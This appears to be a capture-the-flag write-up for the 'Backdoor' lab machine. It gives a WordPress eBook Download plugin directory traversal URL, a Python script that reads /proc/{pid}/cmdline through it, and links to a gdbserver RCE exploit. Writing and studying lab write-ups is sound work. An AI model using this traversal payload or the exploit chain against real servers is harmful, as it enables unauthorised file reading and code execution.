# Backdoor Write-Up

Easy

Tags: 
`PHP`
`Wordpress`
`Directory traversal`

## Intro

1. Wordpress -> Plugin -> Directory traversal
2. Brute-force `/proc/{pid}/cmdline`
3. RCE gdbserver

## Exploit

(option) Save IP address to `/etc/hosts`

```
echo "10.10.11.125 backdoor.htb" | sudo tee -a /etc/hosts
```

### Port scanning

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Plugin

Default location for Wordpress plugins: `/wp-content/plugins`

[WordPress Plugin eBook Download 1.1 - Directory Traversal](https://www.exploit-db.com/exploits/39575)

### Brute-force `/proc/{pid}/cmdline`

```py
def scan_proc_pid_cmdline():
    with open('output.txt', 'w') as f:
        output = ''
        for pid in range(850, 860):
            url = f'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{pid}/cmdline'    
            res = requests.get(url)
            out = res.text.replace(f'/proc/{pid}/cmdline/proc/{pid}/cmdline','').replace(f'/proc/{pid}/cmdline','').replace('<script>window.close()</script>','')
            print(f'{pid} - {out}')    
            output += out + '\n'
        f.write(output)
```

### RCE gdbserver

[GNU gdbserver 9.2 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/50539)
